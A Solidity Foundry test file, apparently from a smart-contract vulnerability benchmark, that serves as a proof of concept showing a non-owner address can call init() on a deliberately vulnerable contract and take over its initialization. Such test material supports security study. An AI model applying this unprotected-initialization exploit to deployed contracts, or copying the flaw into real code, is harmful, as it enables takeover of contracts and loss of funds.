// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/integer_overflow_multitx_multifunc_feasible.sol";

contract AccessControlTest is Test {
    IntegerOverflowMultiTxMultiFuncFeasible target;
    address owner = address(0xF1a7);
    address nonOwner = address(0x111);

    function setUp() public {
        vm.startPrank(owner);
        target = new IntegerOverflowMultiTxMultiFuncFeasible();
        vm.stopPrank();
    }

    function test_NonOwnerCanInitialize() public {
        console2.log("--- BEFORE Trigger ---");
        console2.log("Contract deployment state: Not initialized");
        
        console2.log("--- Trigger Action ---");
        console2.log("Non-owner (0x111) attempts to initialize");
        vm.prank(nonOwner);
        target.init();

        console2.log("--- AFTER Trigger ---");
        console2.log("Verifying contract state by attempting re-initialization...");
        
        vm.prank(nonOwner);
        vm.expectRevert("Already initialized");
        target.init();

        console2.log("State check passed: Re-initialization reverted successfully");
        console2.log("Vulnerability Exists: Non-owner successfully initialized the contract");
    }
}